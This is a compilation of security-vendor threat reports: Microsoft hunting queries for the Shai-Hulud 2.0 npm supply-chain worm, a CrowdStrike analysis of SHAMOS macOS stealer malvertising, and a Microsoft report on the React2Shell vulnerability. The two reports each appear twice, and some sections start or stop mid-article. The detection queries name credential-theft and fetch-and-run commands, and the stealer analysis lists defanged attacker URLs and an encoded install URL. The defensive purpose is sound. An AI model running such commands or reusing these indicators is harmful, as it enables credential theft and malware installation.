Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics: Activity Profile: From vulnerable workflows to self-replicating malware: Technical analysis of npm supply chain security incidents Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Attack path analysis Attack path analysis shows paths from exposed entry points to targets. Security teams can use attack path analysis to surface cross-domain exposure risks, for example how an attacker could move from externally reachable resources to sensitive systems to escalate privileges and maintain persistence. While supply chain attacks like those used by Shai-Hulud 2.0 can originate without direct exposure, customers can leverage advanced hunting to query the Exposure Graph for these broader relationships. For example, once a virtual or physical machine is determined to be compromised, key vaults that are directly accessible using credentials obtained from the compromised system can also be identified. The relevant access paths can be extracted using queries, as detailed in the hunting section below. Any key vault found along these paths should be investigated according to the mitigation guide. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following queries to find related activity in their networks: Attempts of malicious JS execution through node DeviceProcessEvents | where FileName has \"node\" and ProcessCommandLine has_any (\"setup_bun.js\", \"bun_environment.js\") Suspicious process launched by malicious JavaScript DeviceProcessEvents | where InitiatingProcessFileName in~ (\"node\", \"node.exe\") and InitiatingProcessCommandLine endswith \".js\" | where (FileName in~ (\"bun\", \"bun.exe\") and ProcessCommandLine has \".js\") or (FileName in~ (\"cmd.exe\") and ProcessCommandLine has_any (\"where bun\", \"irm \", \"[Environment]::GetEnvironmentVariable('PATH'\", \"|iex\")) or (ProcessCommandLine in~ (\"sh\", \"dash\", \"bash\") and ProcessCommandLine has_any (\"which bun\", \".bashrc && echo $PATH\", \"https://bun.sh/install\")) | where ProcessCommandLine !contains \"bun\" and ProcessCommandLine !contains \"\\\\\" and ProcessCommandLine !contains \"--\" GitHub exfiltration DeviceProcessEvents | where FileName has_any (\"bash\",\"Runner.Listener\",\"cmd.exe\") | where ProcessCommandLine has 'SHA1HULUD' and not (ProcessCommandLine has_any('malicious','grep','egrep',\"checknpm\",\"sha1hulud-checker-ado\",\"sha1hulud-checker-ado\",\" sha1hulud-checker-github\",\"sha1hulud-checker\",\"sha1hulud-scanner\",\"go-detector\",\"SHA1HULUD_IMMEDIATE_ACTIONS.md\",\"SHA1HULUD_COMPREHENSIVE_REPORT.md\",\"reddit.com\",\"sha1hulud-scan.sh\")) Paths from compromised machines and repositories to cloud key management services let T_src2Key = ExposureGraphEdges | where EdgeLabel == 'contains' | where SourceNodeCategories has_any ('code_repository', 'virtual_machine' , 'physical_device') | where TargetNodeCategories has 'secret' | project SourceNodeId, SourceNodeLabel, SourceNodeName, keyNodeId=TargetNodeId, keyNodeLabel=TargetNodeLabel; let T_key2identity = ExposureGraphEdges | where EdgeLabel == 'can authenticate as' | where SourceNodeCategories has 'key' | where TargetNodeCategories has 'identity' | project keyNodeId=SourceNodeId, identityNodeId=TargetNodeId; ExposureGraphEdges | where EdgeLabel == 'has permissions to' | where SourceNodeCategories has 'identity' | where TargetNodeCategories has \"keys_management_service\" | join hint.strategy=shuffle kind=inner (T_key2identity) on $left.SourceNodeId==$right.identityNodeId | join hint.strategy=shuffle kind=inner (T_src2Key) on keyNodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, srcEntityId=EntityIds) on $left.SourceNodeId1==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, identityEntityId=EntityIds) on $left.identityNodeId==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, kmsEntityId=EntityIds) on $left.TargetNodeId==$right.NodeId | project srcLabel=SourceNodeLabel1, srcName=SourceNodeName1, srcEntityId, keyNodeLabel, identityLabel=SourceNodeLabel, identityName=SourceNodeName, identityEntityId, kmsLabel=TargetNodeLabel, kmsName=TargetNodeName, kmsEntityId | extend Path = strcat('srcLabel',' contains','keyNodeLabel',' can authenticate as', ' identityLabel', ' has permissions to', ' kmsLabel') Setup of the GitHub runner with the malicious repository and downloads of the malicious bun.sh script that facilitates this CloudProcessEvents | where (ProcessCommandLine has \"--name SHA1HULUD\" ) or (ParentProcessName == \"node\" and (ProcessName == \"bash\" or ProcessName == \"dash\" or ProcessName == \"sh\") and ProcessCommandLine has \"curl -fsSL https://bun.sh/install | bash\") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Credential collection using TruffleHog and Azure CLI CloudProcessEvents | where (ParentProcessName == \"bun\" and ProcessName in (\"bash\",\"dash\",\"sh\") and ProcessCommandLine has_any(\"az account get-access-token\",\"azd auth token\")) or (ParentProcessName == \"bun\" and ProcessName == \"tar\" and ProcessCommandLine has_any (\"trufflehog\",\"truffler-cache\")) | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Cloud security explorer Microsoft Defender for Cloud customers can also use cloud security explorer to surface possibly compromised software packages. The following screenshot represents a query that searches for a virtual machine or repository allowing lateral movement to a key vault. View the query builder . Figure 5. Cloud security explorer query The security explorer templates library has been expanded with two additional queries that retrieve all container images with compromised software packages and all the running containers with these images. Another means for security teams to proactively identify the scope of this threat is by leveraging the Cloud Security Explorer to query the granular Software Bill of Materials (SBOM) generated by agentless scanners. This capability allows you to execute dynamic, graph-based queries across your entire multi-cloud estate\u2014including virtual machines, containers, and code repositories\u2014to pinpoint specific software components and their versions without the need for agent deployment. For the Shai-Hulud 2.0 campaign, you can use the Cloud Security Explorer to map your software inventory directly to the list of known malicious packages. By running targeted queries that search for the specific compromised package names identified in our threat intelligence, you can instantly visualize the blast radius of the attack within your environment. This enables you to locate every asset containing a malicious dependency and prioritize remediation efforts effectively. Figure 6. Cloud Security Explorer query Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.

SHAMOS Delivery on macOS August 20, 2025 | Maddie Stewart - Suweera De Souza - Ash Leslie - Doug Brown | Engineering & Tech \u2022 Threat Hunting & Intel Between June and August 2025, the CrowdStrike Falcon\u00ae platform successfully blocked a sophisticated malware campaign that attempted to compromise over 300 customer environments. The campaign deployed SHAMOS , a variant of Atomic macOS Stealer (AMOS) developed by the cybercriminal group COOKIE SPIDER. Operating as malware-as-a-service, COOKIE SPIDER rents this information stealer to cybercriminals who deploy it to harvest sensitive information and cryptocurrency assets from victims. The campaign utilized malvertising to direct users to fraudulent macOS help websites where victims were instructed to execute a malicious one-line installation command. This campaign underscores the popularity of malicious one-line installation commands among eCrime actors. This technique allows them to bypass Gatekeeper security checks and install the Mach-O executable directly onto victim devices. Cuckoo Stealer and SHAMOS operators have previously leveraged this method in Homebrew malvertising campaigns occurring between May 2024 and January 2025. Details In an exemplar campaign from June 2025, when the victim searches for a macOS-related issue \u2014 for example, \u201cmacos flush resolver cache\u201d \u2014 they receive a promoted malvertising website in their search results (Figure 1). Users located in multiple countries \u2014 including the U.S., UK, Japan, China, Colombia, Canada, Mexico, Italy, and others \u2014 received these advertisements; no victims were located in Russia. This is likely due to the fact that Russian eCrime forums prohibit commodity malware operators from targeting users based in Russia and other countries belonging to the Commonwealth of Independent States (CIS). Figure 1. Screenshot of search engine results with promoted malvertising website One Google Advertising profile promoting this spoofed macOS help website appears to be a legitimate Australia-based electronics store, suggesting the eCrime actors responsible are likely spoofing the store name in their Google Advertising profile. This assessment is made with moderate confidence, as this profile\u2019s promoted advertisement URLs appear to relate to macOS help pages \u2014 mac-safer[.]com and rescue-mac[.]com \u2014 and therefore do not align with the legitimate store\u2019s business operations (Figure 2). Figure 2. Google advertising profile The fake help pages provide victims with false instructions for how to fix their problem (Figure 3). Figure 3. False instructions displayed on macOS help pages Both malvertising websites instruct the victims to copy, paste, and execute the following command in Terminal (Figure 4): Figure 4. Malicious one-line installation command displayed on malvertising websites The command decodes the Base64-encoded string aHR0cHM6Ly9pY2xvdWRzZXJ2ZXJzLmNvbS9nbS9pbnN0YWxsLnNo and downloads a file from https[:]//icloudservers[.]com/gm/install[.]sh . This file is a Bash script that captures the user\u2019s password and downloads a SHAMOS Mach-O executable from https[:]//icloudservers[.]com/gm/update (Figure 5). Figure 5. Bash script contents Since first reporting on this type of campaign in June 2025, CrowdStrike Counter Adverary Operations has continued to observe opportunistic eCrime threat actors leveraging malicious GitHub repositories to prompt victims to execute commands that download SHAMOS . Similar to the aforementioned activity, campaign operators allege to offer a free download of a tool designed for macOS; these tools involve video editing software, computer-aided design (CAD) products, macOS performance tools, AI software, and dictation software. The threat actor(s) behind these pages continue to use the malicious one-line command to install SHAMOS . In some cases, the command is written entirely in plain text, and in others, the URL that hosts SHAMOS is Base64-encoded (Figure 6). Figure 6. Samples of malicious one-line installation commands displayed on malvertising websites throughout July and August 2025 SHAMOS Installation/Execution The malicious installation command downloads SHAMOS Mach-O into the /tmp/ directory, removes extended file attributes using xattr likely for bypassing Gatekeeper checks, assigns executable permissions via chmod , and then executes the stealer. SHAMOS executes anti-VM commands to verify that the Mach-O is not executing in a suspected sandbox environment. The stealer then executes a variety of AppleScript commands for host reconnaissance and data collection tasks, including searching for known cryptocurrency-related wallet files and sensitive credential-based files on disk. SHAMOS attempts to exfiltrate collected sensitive files, including data from Keychain, AppleNotes, and browsers, using curl to transmit the data in a ZIP archive named out.zip (Figure 7). Figure 7. Falcon UI detection on the binary execution from tmp SHAMOS downloads additional malicious payloads, including a spoofed Ledger Live wallet application and a botnet module, to the victim\u2019s home directory as hidden files and assigns them with executable permissions. The stealer also configures a Plist file named com.finder.helper.plist for persistence and saves it to the User\u2019s LaunchDaemons directory if the victim has Sudo privileges. CrowdStrike observed multiple curl commands, likely suggesting the eCrime actor was using SHAMOS \u2019s botnet module (Figure 8). Figure 8. Falcon UI detection demonstrating likely botnet module use Additional Reporting Open-source reporting detailed an additional malvertising campaign related to the observed activity. This campaign involved a GitHub repository masquerading as iTerm2\u2019s GitHub repository, located at https[:]//github[.]com/jeryrymoore/Iterm2 , that contained instructions detailing how to download iTerm2, a terminal emulator for macOS (Figure 9). 1 The malicious one-line installation command is nearly identical to the command used in the malvertising campaign; however, the campaign\u2019s Bash script host URL is not Base64-encoded. The Bash script \u2014 retrieved from https[:]//macostutorial[.]com/iterm2/install[.]sh \u2014 downloads SHAMOS from https[:]//macostutorial[.]com/iterm2/update . Figure 9. GitHub repository containing fake iTerm2 installation instructions CrowdStrike Falcon Coverage CrowdStrike employs a layered approach for malware detection using machine learning and indicators of attack (IOAs). As shown in Figure 10, the CrowdStrike Falcon\u00ae sensor\u2019s machine learning capabilities and behavior-based detection capabilities (IOAs) can automatically detect and prevent SHAMOS in the initial stages of the attack chain (i.e., as soon as the malware is downloaded onto the victim\u2019s machine and at execution of the malicious shell script). Additionally, IOAs can recognize malicious behavior at further stages in the attack chain, including when the threat actor attempts to employ tactics like data collection, persistence, execution of further binaries, and data exfiltration. Figure 10. Falcon UI detection on execution of Bash script Assessment This campaign highlights that leveraging malvertising and the one-line installation-command technique to distribute macOS information stealers remains popular among eCrime actors. Promoting false malicious websites encourages more site traffic, which will lead to more potential victims. The one-line installation command enables eCrime actors to directly install the Mach-O executable onto the victim\u2019s machine while bypassing Gatekeeper checks. CrowdStrike Counter Adversary Operations assesses that eCrime actors will likely continue to leverage both malvertising and one-line installation commands to distribute macOS information stealers.

SHAMOS Delivery on macOS August 20, 2025 | Maddie Stewart - Suweera De Souza - Ash Leslie - Doug Brown | Engineering & Tech \u2022 Threat Hunting & Intel Between June and August 2025, the CrowdStrike Falcon\u00ae platform successfully blocked a sophisticated malware campaign that attempted to compromise over 300 customer environments. The campaign deployed SHAMOS , a variant of Atomic macOS Stealer (AMOS) developed by the cybercriminal group COOKIE SPIDER. Operating as malware-as-a-service, COOKIE SPIDER rents this information stealer to cybercriminals who deploy it to harvest sensitive information and cryptocurrency assets from victims. The campaign utilized malvertising to direct users to fraudulent macOS help websites where victims were instructed to execute a malicious one-line installation command. This campaign underscores the popularity of malicious one-line installation commands among eCrime actors. This technique allows them to bypass Gatekeeper security checks and install the Mach-O executable directly onto victim devices. Cuckoo Stealer and SHAMOS operators have previously leveraged this method in Homebrew malvertising campaigns occurring between May 2024 and January 2025. Details In an exemplar campaign from June 2025, when the victim searches for a macOS-related issue \u2014 for example, \u201cmacos flush resolver cache\u201d \u2014 they receive a promoted malvertising website in their search results (Figure 1). Users located in multiple countries \u2014 including the U.S., UK, Japan, China, Colombia, Canada, Mexico, Italy, and others \u2014 received these advertisements; no victims were located in Russia. This is likely due to the fact that Russian eCrime forums prohibit commodity malware operators from targeting users based in Russia and other countries belonging to the Commonwealth of Independent States (CIS). Figure 1. Screenshot of search engine results with promoted malvertising website One Google Advertising profile promoting this spoofed macOS help website appears to be a legitimate Australia-based electronics store, suggesting the eCrime actors responsible are likely spoofing the store name in their Google Advertising profile. This assessment is made with moderate confidence, as this profile\u2019s promoted advertisement URLs appear to relate to macOS help pages \u2014 mac-safer[.]com and rescue-mac[.]com \u2014 and therefore do not align with the legitimate store\u2019s business operations (Figure 2). Figure 2. Google advertising profile The fake help pages provide victims with false instructions for how to fix their problem (Figure 3). Figure 3. False instructions displayed on macOS help pages Both malvertising websites instruct the victims to copy, paste, and execute the following command in Terminal (Figure 4): Figure 4. Malicious one-line installation command displayed on malvertising websites The command decodes the Base64-encoded string aHR0cHM6Ly9pY2xvdWRzZXJ2ZXJzLmNvbS9nbS9pbnN0YWxsLnNo and downloads a file from https[:]//icloudservers[.]com/gm/install[.]sh . This file is a Bash script that captures the user\u2019s password and downloads a SHAMOS Mach-O executable from https[:]//icloudservers[.]com/gm/update (Figure 5). Figure 5. Bash script contents Since first reporting on this type of campaign in June 2025, CrowdStrike Counter Adverary Operations has continued to observe opportunistic eCrime threat actors leveraging malicious GitHub repositories to prompt victims to execute commands that download SHAMOS . Similar to the aforementioned activity, campaign operators allege to offer a free download of a tool designed for macOS; these tools involve video editing software, computer-aided design (CAD) products, macOS performance tools, AI software, and dictation software. The threat actor(s) behind these pages continue to use the malicious one-line command to install SHAMOS . In some cases, the command is written entirely in plain text, and in others, the URL that hosts SHAMOS is Base64-encoded (Figure 6). Figure 6. Samples of malicious one-line installation commands displayed on malvertising websites throughout July and August 2025 SHAMOS Installation/Execution The malicious installation command downloads SHAMOS Mach-O into the /tmp/ directory, removes extended file attributes using xattr likely for bypassing Gatekeeper checks, assigns executable permissions via chmod , and then executes the stealer. SHAMOS executes anti-VM commands to verify that the Mach-O is not executing in a suspected sandbox environment. The stealer then executes a variety of AppleScript commands for host reconnaissance and data collection tasks, including searching for known cryptocurrency-related wallet files and sensitive credential-based files on disk. SHAMOS attempts to exfiltrate collected sensitive files, including data from Keychain, AppleNotes, and browsers, using curl to transmit the data in a ZIP archive named out.zip (Figure 7). Figure 7. Falcon UI detection on the binary execution from tmp SHAMOS downloads additional malicious payloads, including a spoofed Ledger Live wallet application and a botnet module, to the victim\u2019s home directory as hidden files and assigns them with executable permissions. The stealer also configures a Plist file named com.finder.helper.plist for persistence and saves it to the User\u2019s LaunchDaemons directory if the victim has Sudo privileges. CrowdStrike observed multiple curl commands, likely suggesting the eCrime actor was using SHAMOS \u2019s botnet module (Figure 8). Figure 8. Falcon UI detection demonstrating likely botnet module use Additional Reporting Open-source reporting detailed an additional malvertising campaign related to the observed activity. This campaign involved a GitHub repository masquerading as iTerm2\u2019s GitHub repository, located at https[:]//github[.]com/jeryrymoore/Iterm2 , that contained instructions detailing how to download iTerm2, a terminal emulator for macOS (Figure 9). 1 The malicious one-line installation command is nearly identical to the command used in the malvertising campaign; however, the campaign\u2019s Bash script host URL is not Base64-encoded. The Bash script \u2014 retrieved from https[:]//macostutorial[.]com/iterm2/install[.]sh \u2014 downloads SHAMOS from https[:]//macostutorial[.]com/iterm2/update . Figure 9. GitHub repository containing fake iTerm2 installation instructions CrowdStrike Falcon Coverage CrowdStrike employs a layered approach for malware detection using machine learning and indicators of attack (IOAs). As shown in Figure 10, the CrowdStrike Falcon\u00ae sensor\u2019s machine learning capabilities and behavior-based detection capabilities (IOAs) can automatically detect and prevent SHAMOS in the initial stages of the attack chain (i.e., as soon as the malware is downloaded onto the victim\u2019s machine and at execution of the malicious shell script). Additionally, IOAs can recognize malicious behavior at further stages in the attack chain, including when the threat actor attempts to employ tactics like data collection, persistence, execution of further binaries, and data exfiltration. Figure 10. Falcon UI detection on execution of Bash script Assessment This campaign highlights that leveraging malvertising and the one-line installation-command technique to distribute macOS information stealers remains popular among eCrime actors. Promoting false malicious websites encourages more site traffic, which will lead to more potential victims. The one-line installation command enables eCrime actors to directly install the Mach-O executable onto the victim\u2019s machine while bypassing Gatekeeper checks. CrowdStrike Counter Adversary Operations assesses that eCrime actors will likely continue to leverage both malvertising and one-line installation commands to distribute macOS information stealers. This assessment is made with high confidence, as the combination has historically been successful, and these methods allow actors to bypass Gatekeeper checks.

Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Microsoft Defender Vulnerability Management Microsoft Defender XDR Microsoft Security Experts Microsoft Sentinel Topics Endpoint security Threat intelligence CVE-2025-55182 (also referred to as React2Shell and includes CVE-2025-66478, which was merged into it) is a critical pre-authentication remote code execution (RCE) vulnerability affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, this vulnerability could allow attackers to execute arbitrary code on vulnerable servers through a single malicious HTTP request. Exploitation activity related to this vulnerability was detected as early as December 5, 2025. Most successful exploits originated from red team assessments; however, we also observed real-world exploitation attempts by threat actors delivering multiple subsequent payloads, majority of which are coin miners. Both Windows and Linux environments have been observed to be impacted. The React Server Components ecosystem is a collection of packages, frameworks, and bundlers that enable React 19 applications to run parts of their logic on the server rather than the browser. It uses the Flight protocol to communicate between client and server. When a client requests data, the server receives a payload, parses this payload, executes server-side logic, and returns a serialized component tree. The vulnerability exists because affected React Server Components versions fail to validate incoming payloads. This could allow attackers to inject malicious structures that React accepts as valid, leading to prototype pollution and remote code execution. This vulnerability presents a significant risk because of the following factors: Default configurations are vulnerable, requiring no special setup or developer error. Public proof-of-concept exploits are readily available with near-100% reliability. Exploitation can happen without any user authentication since this is a pre-authentication vulnerability. The vulnerability could be exploited using a single malicious HTTP request. In this report, Microsoft Defender researchers share insights from observed attacker activity exploiting this vulnerability. Detailed analyses, detection insights, as well as mitigation recommendations and hunting guidance are covered in the next sections. Further investigation towards providing stronger protection measures is in progress, and this report will be updated when more information becomes available. Analyzing CVE-2025-55182 exploitation activity React is widely adopted in enterprise environments. In Microsoft Defender telemetry, we see tens of thousands of distinct devices across several thousand organizations running some React or React-based applications. Some of the vulnerable applications are deployed inside containers, and the impact on the underlying host is dependent on the security configurations of the container . We identified several hundred machines across a diverse set of organizations compromised using common tactics, techniques, and procedures (TTPs) observed with web application RCE. To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime. Figure 1: Attack diagram depicting activity leading to action on objectives Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified authorized_keys file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *.trycloudflare.com ) and used bind mounts to hide malicious processes and artifacts from system monitoring tools. The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft. Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service\u2011account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens. Figure 2: Example of reverse shell observed in one of the campaigns Mitigation and protection guidance Microsoft recommends customers to act on these mitigation recommendations: Manual identification guidance Until full in-product coverage is available, you can manually assess exposure on servers or containers: Navigate to your project directory and open the node_modules folder. Review installed packages and look for: react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack next Validate versions against the known affected range: React: 19.0.0,19.1.0, 19.1.1, 19.2.0 Next.js: 15.0.0 \u2013 15.0.4, 15.1.0 \u2013 15.1.8, 15.2.0 \u2013 15.2.5, 15.3.0 \u2013 15.3.5, 15.4.0 \u2013 15.4.7, 15.5.0 \u2013 15.5.6, 16.0.0 \u2013 16.0.6, 14.3.0-canary.77 and later canary releases If any of these packages match the affected versions, remediation is required. Prioritize internet-facing assets first, especially those identified by Defender as externally exposed. Mitigation best practices Patch immediately React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line): React: 19.0.1, 19.1.2, 19.2.1 Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies. Prioritize exposed services Patch all affected systems, starting with internet-facing workloads. Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate. Monitor for exploit activity Review MDVM dashboards and Defender alerts for indicators of attempted exploitation. Correlate endpoint, container, and cloud signals for higher confidence triage. Invoke incident response process to address any related suspicious activity stemming from this vulnerability. Add WAF protections where appropriate Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has published rule guidance and JSON examples in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified. Recommended customer action checklist Identify affected React Server Components packages in your applications and images. Upgrade to patched versions. Refer to the React page for patching guidance. Prioritize internet-facing services for emergency change windows. Enable and monitor Defender alerts tied to React Server Components exploitation attempts. Apply Azure WAF custom rules as a compensating control where feasible. Use MDVM to validate coverage and confirm risk reduction post-update. CVE-2025-55182 represents a high-impact, low-friction attack path against modern React Server Components deployments. Rapid patching combined with layered Defender monitoring and WAF protections provides the strongest short-term and long-term risk reduction strategy.

Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Microsoft Defender Vulnerability Management Microsoft Defender XDR Microsoft Security Experts Microsoft Sentinel Topics Endpoint security Threat intelligence CVE-2025-55182 (also referred to as React2Shell and includes CVE-2025-66478, which was merged into it) is a critical pre-authentication remote code execution (RCE) vulnerability affecting React Server Components, Next.js, and related frameworks. With a CVSS score of 10.0, this vulnerability could allow attackers to execute arbitrary code on vulnerable servers through a single malicious HTTP request. Exploitation activity related to this vulnerability was detected as early as December 5, 2025. Most successful exploits originated from red team assessments; however, we also observed real-world exploitation attempts by threat actors delivering multiple subsequent payloads, majority of which are coin miners. Both Windows and Linux environments have been observed to be impacted. The React Server Components ecosystem is a collection of packages, frameworks, and bundlers that enable React 19 applications to run parts of their logic on the server rather than the browser. It uses the Flight protocol to communicate between client and server. When a client requests data, the server receives a payload, parses this payload, executes server-side logic, and returns a serialized component tree. The vulnerability exists because affected React Server Components versions fail to validate incoming payloads. This could allow attackers to inject malicious structures that React accepts as valid, leading to prototype pollution and remote code execution. This vulnerability presents a significant risk because of the following factors: Default configurations are vulnerable, requiring no special setup or developer error. Public proof-of-concept exploits are readily available with near-100% reliability. Exploitation can happen without any user authentication since this is a pre-authentication vulnerability. The vulnerability could be exploited using a single malicious HTTP request. In this report, Microsoft Defender researchers share insights from observed attacker activity exploiting this vulnerability. Detailed analyses, detection insights, as well as mitigation recommendations and hunting guidance are covered in the next sections. Further investigation towards providing stronger protection measures is in progress, and this report will be updated when more information becomes available. Analyzing CVE-2025-55182 exploitation activity React is widely adopted in enterprise environments. In Microsoft Defender telemetry, we see tens of thousands of distinct devices across several thousand organizations running some React or React-based applications. Some of the vulnerable applications are deployed inside containers, and the impact on the underlying host is dependent on the security configurations of the container . We identified several hundred machines across a diverse set of organizations compromised using common tactics, techniques, and procedures (TTPs) observed with web application RCE. To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime. Figure 1: Attack diagram depicting activity leading to action on objectives Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified authorized_keys file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *.trycloudflare.com ) and used bind mounts to hide malicious processes and artifacts from system monitoring tools. The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft. Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service\u2011account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens. Figure 2: Example of reverse shell observed in one of the campaigns Mitigation and protection guidance Microsoft recommends customers to act on these mitigation recommendations: Manual identification guidance Until full in-product coverage is available, you can manually assess exposure on servers or containers: Navigate to your project directory and open the node_modules folder. Review installed packages and look for: react-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack next Validate versions against the known affected range: React: 19.0.0,19.1.0, 19.1.1, 19.2.0 Next.js: 15.0.0 \u2013 15.0.4, 15.1.0 \u2013 15.1.8, 15.2.0 \u2013 15.2.5, 15.3.0 \u2013 15.3.5, 15.4.0 \u2013 15.4.7, 15.5.0 \u2013 15.5.6, 16.0.0 \u2013 16.0.6, 14.3.0-canary.77 and later canary releases If any of these packages match the affected versions, remediation is required. Prioritize internet-facing assets first, especially those identified by Defender as externally exposed. Mitigation best practices Patch immediately React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line): React: 19.0.1, 19.1.2, 19.2.1 Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies. Prioritize exposed services Patch all affected systems, starting with internet-facing workloads. Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate. Monitor for exploit activity Review MDVM dashboards and Defender alerts for indicators of attempted exploitation. Correlate endpoint, container, and cloud signals for higher confidence triage. Invoke incident response process to address any related suspicious activity stemming from this vulnerability. Add WAF protections where appropriate Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has published rule guidance and JSON examples in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified. Recommended customer action checklist Identify affected React Server Components packages in your applications and images. Upgrade to patched versions. Refer to the React page for patching guidance. Prioritize internet-facing services for emergency change windows. Enable and monitor Defender alerts tied to React Server Components exploitation attempts. Apply Azure WAF custom rules as a compensating control where feasible. Use MDVM to validate coverage and confirm risk reduction post-update. CVE-2025-55182 represents a high-impact, low-friction attack path against modern React Server Components deployments. Rapid patching combined with layered Defender monitoring and WAF protections provides the strongest short-term and long-term risk reduction strategy.

This capability merges pre-breach estate understanding with post-breach views allowing security teams to map their interconnected assets and highlights potential paths teams can prioritize for remediation efforts based on the criticality of assets and their interconnectivity to the compromised entities. Microsoft Defender for Cloud Microsoft Defender for Cloud customers can use security explorer templates to locate exposed containers running vulnerable container images and vulnerable virtual machines. Template titled Internet exposed containers running container images vulnerable to React2Shell vulnerability CVE-2025-55182 and Internet exposed virtual machines vulnerable to React2Shell vulnerability CVE-2025-55182 are added to the gallery. Figure 3. Microsoft Defender for Cloud security explorer templates related to CVE-2025-55182 Microsoft Security Exposure Management Microsoft Security Exposure Management\u2019s automated attack path analysis maps out potential threats by identifying exposed resources and tracing the routes an attacker might take to compromise critical assets. This analysis highlights vulnerable cloud compute resources, such as virtual machines and Kubernetes containers, that are susceptible to remote code execution vulnerabilities, including React2Shell CVEs. It also outlines possible lateral movement steps an adversary might take within the environment. The attack paths are presented for all supported cloud environments, including Azure, AWS, and GCP. To view these paths, filter the view in Microsoft Security Exposure Management, filter by entry point type: Kubernetes container Virtual Machine AWS EC2 instance GCP compute instance. Alternatively, in Microsoft Defender for Cloud, customers can filter by titles such as: Internet exposed 